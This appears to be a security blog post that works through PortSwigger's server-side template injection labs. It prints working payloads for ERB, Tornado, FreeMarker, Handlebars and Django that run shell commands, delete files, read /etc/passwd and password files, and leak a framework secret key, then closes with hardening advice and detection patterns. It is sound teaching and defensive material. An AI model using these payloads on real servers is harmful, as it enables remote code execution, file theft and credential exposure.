---
layout: post
title: "SSTI Is Context First"
date: 2026-06-19 09:30:00 +0800
categories: [web-security, methodology, detection-engineering]
tags: [ssti, templates, portswigger, sandbox, django]
excerpt: "Server-side template injection is context first: raw text, expression, object, sandbox, and custom business-object contexts require different exploit paths."
related_posts:
  - blind-command-injection-is-a-channel-problem
  - xss-is-a-parser-boundary-problem
  - four-ways-llm-apps-turn-data-into-actions
---

{% raw %}

Server-side template injection is often taught as a list of payloads. That is useful for recognition, but it is not the main skill.

The main skill is context.

Before choosing a payload, answer one question:

**Where did my input land inside the template?**

The seven PortSwigger SSTI labs move through the important cases: raw template text, expression context, documentation-driven exploitation, unknown engine fingerprinting, object disclosure, sandbox escape, and custom business-object abuse.

## The context map

| Context | What to do first |
|---------|------------------|
| raw text | inject a complete expression |
| existing expression | escape the current syntax |
| editable template | fingerprint the engine, then read docs |
| object context | enumerate available objects and properties |
| sandbox | find reachable methods on exposed objects |
| custom business object | map method side effects |

This framing avoids the common failure mode: dropping a famous payload into the wrong syntactic position.

## Text context is straightforward

In the ERB lab, the `message` parameter is rendered as template source. A harmless probe:

```erb
<%= 7*7 %>
```

returns `49`. Ruby's `system()` then gives the required effect:

```erb
<%= system("rm /home/carlos/morale.txt") %>
```

That is the easy case because the input controls a full template fragment.

## Code context needs an escape

The Tornado lab is different. The preferred-name setting is inserted into an existing expression. The proof starts by closing that expression:

```text
user.name}}{{7*7}}
```

Then the final payload imports `os`:

```text
user.name}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}
```

The exploit is not "Tornado equals this payload." The exploit is "break out of the current expression, then introduce a new template statement."

## Documentation beats memorization

The FreeMarker documentation lab points to `?new` and `freemarker.template.utility.Execute`:

```freemarker
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")}
```

This is the workflow worth keeping: identify the engine, find object creation or utility classes in the docs, and only then build the payload.

The Handlebars lab goes the other direction. A fuzz string produces an error that identifies the engine:

```text
${{<%[%'"}}%\
```

The documented exploit pivots through constructors and executes JavaScript:

```js
return require('child_process').exec('rm /home/carlos/morale.txt');
```

Constrained template languages often become dangerous through helper objects and constructors rather than direct command primitives.

## SSTI is not always RCE

The Django lab is an information-disclosure case. The debug tag exposes the template context:

```django
{% debug %}
```

The `settings` object is present, so the secret key is readable:

```django
{{settings.SECRET_KEY}}
```

That is enough impact. A framework secret can invalidate sessions, enable signing attacks, or expose deployment assumptions even when arbitrary command execution is unavailable.

## Sandboxes are object-capability problems

In the FreeMarker sandbox lab, the useful object is `product`:

```freemarker
${product.getClass()}
```

From there, Java methods provide a file-read chain through class metadata and URL streams:

```freemarker
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

The output is decimal byte values. Convert them to ASCII and submit the password.

The point is broader than FreeMarker: any sandbox that exposes rich objects needs an allowlist model, not just a blacklist of scary method names.

## Custom objects change the game

The final lab exposes a `user` object. The winning chain is not a template-engine escape. It is method composition:

1. Avatar upload errors reveal `user.setAvatar()` and a PHP source path.
2. `user.setAvatar('/etc/passwd','image/jpg')` plus `/avatar?avatar=wiener` confirms arbitrary file read.
3. Reading `User.php` reveals `gdprDelete()`.
4. Set the avatar to `/home/carlos/.ssh/id_rsa`.
5. Call `user.gdprDelete()` to delete it.

This is object capability analysis. Once powerful objects enter the template context, template syntax is just the delivery mechanism.

## Defender notes

Hardening:

- never concatenate user input into template source;
- pass user input as data variables only;
- do not let low-privilege users edit server-side templates;
- expose minimal DTOs, not framework objects or user models;
- keep settings, request objects, service objects, and file-handling methods out of template context;
- disable dangerous helpers, constructors, object creation, and reflection;
- return generic template errors to users.

Detection:

- parameters containing `<%=`, `{{`, `${`, `{%`, `#with`, `?new`, `getClass()`, or `constructor`;
- template edits containing `settings.SECRET_KEY`, `debug`, `child_process`, `system(`, `openStream`, or sensitive file paths;
- template errors exposing engine names, stack traces, class paths, or method signatures;
- avatar/image endpoints returning non-image content;
- profile display-name changes followed by file reads, file deletion, or process execution.

The practical rule is simple: map the context before picking the payload. SSTI is a parser problem, an object exposure problem, and sometimes an authorization problem, all hidden behind one template delimiter.

{% endraw %}
